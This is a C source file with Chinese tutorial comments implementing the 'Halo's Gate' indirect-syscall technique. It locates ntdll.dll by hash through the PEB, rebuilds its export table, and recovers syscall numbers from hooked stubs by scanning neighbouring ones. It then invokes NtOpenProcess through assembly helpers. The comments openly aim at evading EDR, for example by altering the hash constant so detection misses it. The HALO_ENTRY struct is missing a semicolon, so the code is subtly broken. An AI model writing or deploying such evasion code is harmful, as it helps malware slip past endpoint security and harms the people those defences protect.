#include <windows.h>
#include <winternl.h>
#include <stdio.h>
#include <intrin.h>

/*
step1:定义核心结构体
既然要手动解析内存，我们需要告诉编译器内存里面到底长什么样
这些结构体通常在<winternal.h>里面定义不全，我们手动加上我们需要的内容
*/

//PEB_LDR_DATA
typedef struct _MY_PEB_LDR_DATA{
    ULONG Length;
    BOOLEAN Initialized;
    PVOID SsHandle;
    LIST_ENTRY InLoadOrderModuleList; //按加载顺序排列
    LIST_ENTRY InMemoryOrderModuleList; //按内存顺序排列 key!!!
    LIST_ENTRY InInitializationOrderModuleList; //按初始化顺序排列
} MY_PEB_LDR_DATA, *PMY_PEB_LDR_DATA;

//PEB
typedef struct _MY_PEB{
    BYTE Reserved1[2];
    BYTE BeingDebugged;
    BYTE Reserved2[1];
    BYTE Padding[4]; // [Space Monkey Fix] 显式填充，确保对齐
    PVOID Reserved3[2];
    PMY_PEB_LDR_DATA Ldr; //key!!!
} MY_PEB, *PMY_PEB;

//LDR_DATA_TABLE_ENTRY(链表里面的每一个节点，包含一个dll的具体数据)
typedef struct _MY_LDR_DATA_TABLE_ENTRY{
    LIST_ENTRY InLoadOrderLinks;
    LIST_ENTRY InMemoryOrderLinks; //key!!!
    LIST_ENTRY InInitializationOrderLinks;
    PVOID DllBase; //key!!!
    PVOID EntryPoint;
    ULONG SizeOfImage;
    UNICODE_STRING FullDllName; //DLL的完整路径
    UNICODE_STRING BaseDllName; //key!!! DLL的文件名
} MY_LDR_DATA_TABLE_ENTRY, *PMY_LDR_DATA_TABLE_ENTRY;

/*
step2:遍历逻辑
*/

// djb2 Hash Algorithm (Case Insensitive),这里我们用来验证ntdll.dll节点名
// 这是一个经典的哈希算法，数字 5381 是它的 Magic Number。EDR可能会探测5381这个magic number，你可以修改这个数或者加上异或等操作，实现你自己的魔改算法。
DWORD djb2_hash(WCHAR* str) {
    unsigned long hash = 5381;
    int c;

    // 遍历宽字符串
    while (c = *str++) {
        // [关键] 转小写 (Case Insensitive)
        // 如果字符是大写 A-Z，就加上 32 转成小写 a-z
        if (c >= 'A' && c <= 'Z') {
            c += 32;
        }
        
        // hash * 33 + c
        // (hash << 5) + hash 等价于 hash * 33，但位运算更快
        hash = ((hash << 5) + hash) + c;
    }

    return hash;
}

// ASCII 版 djb2 哈希算法 (用于导出表函数名)
// 注意：导出函数名通常是大小写敏感的 (Case Sensitive)
DWORD djb2_hash_a(char* str) {
    unsigned long hash = 5381;
    int c;

    while (c = *str++) {
        // hash * 33 + c
        hash = ((hash << 5) + hash) + c;
    }

    return hash;
}
#define NTDLL_HASH 0x22d3b5ed
#define MAX_API_COUNT 3000 //一般来说ntdll通常导出2000+个函数，3000的最大限制足够

//定义单个API结构体
typedef struct _API_ENTRY{
    DWORD Hash;
    PVOID Address;
} API_ENTRY, *PAPI_ENTRY;

//定义GetHaloEntry的输出结果，包含SSN以及有效syscall的地址
typedef struct _HALO_ENTRY {
    DWORD SSN;              // 系统调用号
    PVOID SyscallAddress;  
    PVOID FunctionAddress // 蹦床地址 (syscall instruction address)
} HALO_ENTRY, *PHALO_ENTRY;

// 全局军火库 (放在 .data 段)
// 这样做的好处是不用 malloc，且位置固定
API_ENTRY ApiTable[MAX_API_COUNT];
int ApiCount = 0; // 当前收录了多少个 API

//!!!精髓，Halo‘s Gate逻辑
//定义一个用来判断的辅助函数(这里我写反向判断逻辑是因为反向判断更快)
BOOL IsClean(BYTE* address){
    if(address[0] != 0x4c || address[1] != 0x8b || address[2] != 0xD1 || address[3] != 0xB8){
        return FALSE;
    }
    else{
        return TRUE;
    }
}
//定义一个辅助函数来提取有效的syscall地址
PVOID Syscaller_finder(BYTE* address){

    for(int i=1; i<=32; i++){
        if(address[i] == 0x0F && address[i+1] == 0x05 && address[i+2] == 0xC3){
            return (PVOID)(address+i);
        }
    }
    printf("[-] no syscall mode found...");
    return NULL;
}

DWORD GetHaloEntry(PVOID FunctionAddress, PHALO_ENTRY pEntry){
    BYTE* pByte = (BYTE*)FunctionAddress;

    //先检查自己是否纯净
    if(IsClean(pByte)){
        pEntry->SSN = ((pByte[5] << 8) | pByte[4]); // 利用小端序（Little Endian）逻辑，将内存中的高位字节左移并与低位字节合并，重组还原出完整的 16 位系统调用号 (SSN)。 
        pEntry->SyscallAddress = Syscaller_finder(pByte);
        if(pEntry->SyscallAddress != NULL) return TRUE;
    }

    //双向搜索逻辑，最大搜索数设置为前后各32
    for(int i=1; i<=32; i++){
        //向后搜索
        BYTE* pDown = pByte + (i*32);
        if(IsClean(pDown)){
            pEntry->SSN = (((pDown[5] << 8) | pDown[4]) - i);
            pEntry->SyscallAddress = Syscaller_finder(pDown);
            if(pEntry->SyscallAddress != NULL) return TRUE;
        }
        //向前搜索
        BYTE* pUp = pByte - (i*32);
        if(IsClean(pUp)){
            pEntry->SSN = (((pUp[5] << 8) | pUp[4]) + i);
            pEntry->SyscallAddress = Syscaller_finder(pUp);
            if(pEntry->SyscallAddress != NULL) return TRUE;
        }
    }
    return FALSE; //啥也没有
}

//核心，手动解析导出表，查找函数地址
void InitApiTable(PVOID DllBase){
    //1.读取DOS头
    PIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)DllBase; //我们之前拿到的ntdll.dll的基地址事实上在内存中就正好执行PE文件开头的DOS头
    if(pDos->e_magic != IMAGE_DOS_SIGNATURE){ //这里的检查逻辑非常有意思，就是检查“MZ”的名字，验证这是不是一个合法的dll文件
        return;
    }

    //2.通过偏移直接跳转到NT Headers（DllBase + e_lfanew）
    PIMAGE_NT_HEADERS pNT = (PIMAGE_NT_HEADERS)((BYTE*)DllBase + pDos->e_lfanew);
    if(pNT->Signature != IMAGE_NT_SIGNATURE){ //和上面类似，这里检查的是“PE”
        return;
    }

    //3.获取导出表（EAT）
    // 导出表在 DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT] (索引 0)
    // VirtualAddress 存的是 RVA (相对偏移)，必须加上 DllBase 才是内存地址
    PIMAGE_EXPORT_DIRECTORY pExport = (PIMAGE_EXPORT_DIRECTORY)((BYTE*)DllBase+ pNT->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);

    //4.获取三个关键数组地址（RVA + DllBase）
    DWORD* pAddressOfFunctions = (DWORD*)((BYTE*)DllBase + pExport->AddressOfFunctions);
    DWORD* pAddressOfNames = (DWORD*)((BYTE*)DllBase + pExport->AddressOfNames);
    WORD* pAddressOfNameOrdinals = (WORD*)((BYTE*)DllBase + pExport->AddressOfNameOrdinals);//!!!这里要注意，AddressOfNameOrdinals这个地址本身是四位的，但我们需要取出的数据，也就是里面的RVA偏移值，他本身是两位的，所以我们需要一个指针强转

    //5.循环提取数据，填充ApiTable
    printf("[*] Building ApiTable(%d functions)...\n", pExport->NumberOfNames);

    for(DWORD i=0; i<pExport->NumberOfNames; i++){
        //先拿到当前函数名的字符串,记得我们之前说过数组里面存的都是RVA，所以都要加上基址才能获得真是位置
        char* functionName = (char*)((BYTE*)DllBase + pAddressOfNames[i]);
        //计算ASCII Hash
        DWORD currentHash = djb2_hash_a(functionName);
        //拿地址
        WORD ordinal = pAddressOfNameOrdinals[i];
        DWORD rva = pAddressOfFunctions[ordinal];
        PVOID addr = (PVOID)((BYTE*)DllBase + rva);
        //入库
        if(ApiCount < MAX_API_COUNT){
            ApiTable[ApiCount].Hash = currentHash;
            ApiTable[ApiCount].Address = addr;
            ApiCount ++;
        }
    }
    printf("[+] ApiTable Built. Total Entries: %d\n", ApiCount);
}

//定义一个函数来快速查表拿地址
PVOID GetApi(DWORD TargetHash){
    for(int i=0; i< ApiCount; i++){
        if(ApiTable[i].Hash==TargetHash){
            return ApiTable[i].Address;
        }
    }
    printf("[!] No Functions Found...");
    return NULL;
}

//引入我们写的汇编函数
// 这是一个通用的函数指针定义，为了让编译器知道 RunSyscall 可以接受一堆参数
extern void SetSSN(DWORD ssn);
extern void SetSyscallAddr(PVOID SyscallAddr);
extern NTSTATUS RunSyscall(
    PHANDLE ProcessHandle, 
    ACCESS_MASK DesiredAccess, 
    POBJECT_ATTRIBUTES ObjectAttributes, 
    PCLIENT_ID ClientId
);



int main(){
    printf("[*] Walker Initializing...\n");

    //1.首先我们获取PEB的地址，在x64系统中，GS寄存器的0x60偏移处存放PEB地址
    //__readgsqword 是 MSVC 的内联函数，直接生成汇编指令。
    PMY_PEB pPEB = (PMY_PEB)__readgsqword(0x60);
    printf("[*] Got PEB address: 0x%p\n", pPEB);
    printf("--> BeingDebugged: %d\n", pPEB->BeingDebugged);//顺便看看调试状态

    //2.接下来我们获取LDR数据
    PMY_PEB_LDR_DATA pLdr = pPEB->Ldr;
    printf("[*] Got LDR address: 0x%p\n", pLdr);

    //3.遍历InMemoryOrderModuleList链表
    // LIST_ENTRY 是一个双向链表，包含 Flink (Forward Link) 和 Blink (Back Link)，Head 是链表头。  
    LIST_ENTRY* pListHead = &pLdr->InMemoryOrderModuleList;
    LIST_ENTRY* pCurrentEntry = pListHead->Flink; //这是开始，所以指向第一个模块

    printf("[*] Starting Linked List Walkthrough\n");

    //链表中最后一个节点的Flink不会指向空，而是指向链表的头部（head），因此要注意我们的循环条件
    while(pCurrentEntry != pListHead){
        //这里有一个非常重要的点，pCurrentEntry指向的是struct _MY_LDR_DATA_TABLE_ENTRY中的LIST_ENTRY InMemoryOrderLinks;
        //因此：结构体首地址 = 当前链表指针 - InMemoryOrderLinks 的偏移
        
        PMY_LDR_DATA_TABLE_ENTRY pEntry = (PMY_LDR_DATA_TABLE_ENTRY)(
            (unsigned char*)pCurrentEntry - sizeof(LIST_ENTRY)
        );//拿到单个节点（结构体）首地址

        //获取模块信息
        // BaseDllName.Buffer 是宽字符 (wchar_t*)
        if(pEntry->BaseDllName.Buffer != NULL){
            DWORD currentHash = djb2_hash(pEntry->BaseDllName.Buffer);
            wprintf(L"module_name: %-20s | base: 0x%p | Hash: 0x%x\n", pEntry->BaseDllName.Buffer, pEntry->DllBase, currentHash);

            //检查是否为ntdll.dll,我们不能直接使用明文ntdll.dll进行判断，我们需要使用hash值
            if(currentHash == NTDLL_HASH){
                printf("\n[!!!]Target Found(Hash match)!!!\n");
                printf("      Target: ntdll.dll:\n");
                printf("      Base address: 0x%p\n", pEntry->DllBase);

                //初始化军火库
                InitApiTable(pEntry->DllBase);

                //计算哈希并且查找即可，这里使用NtOpenProcess为例
                PVOID pNtOpenProcess = GetApi(0x5003c058);
                if (pNtOpenProcess){
                    printf("[!!!] NtOpenProcess Found : 0x%p\n", pNtOpenProcess);
                    //!!!提取SSN
                    HALO_ENTRY entry;
                    if(GetHaloEntry(pNtOpenProcess, &entry)){
                        printf("[!!!] SSN Extracted: 0x%x (Decimal: %d)\nSyscallAddress: 0x%p\n", entry.SSN, entry.SSN, entry.SyscallAddress);
                        //!!!加入一个试验性的攻击逻辑
                        printf("[*] Preparing to invoke syscall...\n");
                        //将ssn装填进汇编层
                        SetSSN(entry.SSN);
                        //装填syscall
                        SetSyscallAddr(entry.SyscallAddress);
                        //准备参数
                        HANDLE hProcess = NULL;
                        OBJECT_ATTRIBUTES oa;
                        InitializeObjectAttributes(&oa, NULL, 0, NULL, NULL);
                        CLIENT_ID cid;
                        cid.UniqueProcess = (HANDLE)GetCurrentProcessId();
                        cid.UniqueThread = 0;
                        //开火
                        NTSTATUS status = RunSyscall(&hProcess, PROCESS_ALL_ACCESS, &oa, &cid);
                        printf("[*] Syscall executed.\n");
                        printf("--> NTSTATUS: 0x%x\n", status);
                        if(status == 0x00000000 && hProcess != NULL){
                            printf("[+] SUCCESS!! Handle acquired: 0x%p\n", hProcess);
                            CloseHandle(hProcess);//用完即关，保持优雅
                        }else{
                            printf("[-] Failed...");
                        }
                    }
                    else{
                        printf("[-] Failed to extract SSN\n");
                        printf("Forget about the little difference? Go check it you asshole!");
                    }
                }
                else{
                    printf("[-] Hash Not Found...\n");
                }
                break;
                
            }
        }
        //移动到下一节点
        pCurrentEntry = pCurrentEntry->Flink;
    }

    printf("\n[*] Walkthrough Finished\n");
    getchar();
    return 0;

}
//编译指令：x86_64-w64-mingw32-gcc syscaller.c gate.s -o halo_gate_final.exe -static -w
